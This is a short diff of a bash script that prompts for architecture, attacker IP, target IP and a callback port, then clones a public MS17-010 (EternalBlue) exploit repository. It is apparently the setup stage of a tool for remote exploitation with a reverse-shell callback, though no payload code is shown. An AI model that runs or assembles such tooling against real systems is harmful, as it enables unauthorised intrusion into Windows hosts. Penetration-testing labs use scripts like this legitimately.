@@ -1,9 +1,10 @@
 #!/bin/bash
 
-read $arch
-read $IPAddr
-read $localport
-
+echo $'\n';read -p "Enter the architecture of the system:  [86 or 64] " -r arch
+echo $'\n';read -p "Enter your IP address: " -r IPAddr
+echo $'\n';read -p "Enter the target's IP address: " -r targetIP
+echo $'\n';read -p "Enter the port you want to receive the callback on: " -r localport
+echo $'\n';
 cd ~
 git clone https://github.com/worawit/MS17-010.git
 
